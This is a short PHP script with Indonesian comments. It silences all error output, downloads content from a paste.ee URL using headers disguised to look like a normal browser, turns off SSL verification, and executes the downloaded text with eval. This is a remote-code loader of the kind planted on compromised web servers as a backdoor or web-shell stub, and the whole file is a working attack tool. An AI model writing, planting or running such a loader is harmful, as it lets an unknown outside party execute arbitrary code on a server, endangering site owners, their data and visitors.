<?php

error_reporting(0);
ini_set('display_errors', 0);

function getContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);

    // Header penyamaran seperti browser normal
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'Referer: https://paste.ee/r/nxP28',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    ));

    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($curl);
    curl_close($curl);

    return $content;
}

// URL langsung tanpa encode karena tidak diobfuscate
$url = "https://paste.ee/r/nxP28";
$content = getContent($url);

// Eksekusi jika berhasil diambil
if ($content) {
    eval('?>' . $content);
} else {
    echo "âŒ Gagal ambil konten. Mungkin diblokir server atau IP.";
}

?>